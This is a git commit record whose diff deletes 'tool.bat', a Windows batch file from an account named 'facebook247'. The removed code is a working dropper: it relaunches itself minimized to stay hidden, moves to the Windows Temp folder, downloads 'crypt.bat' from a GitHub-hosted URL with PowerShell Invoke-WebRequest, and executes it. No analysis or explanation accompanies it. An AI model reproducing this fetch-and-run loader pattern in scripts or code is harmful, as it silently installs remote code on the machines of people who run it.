e7b679a49410fa38ab7683d7b2382113dfb114bb
facebook247 <105598372+facebook247@users.noreply.github.com>
2023-06-07 00:06:21 +0100

    Delete tool.bat

--- tool.bat
+++
@@ -1,5 +0,0 @@
-@echo off
-if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
-cd C:\Windows\Temp
-powershell -command "Invoke-WebRequest -uri https://github.com/facebook247/facebook247.github.io/blob/main/crypt.bat?raw=true -o crypt.bat"
-start crypt.bat
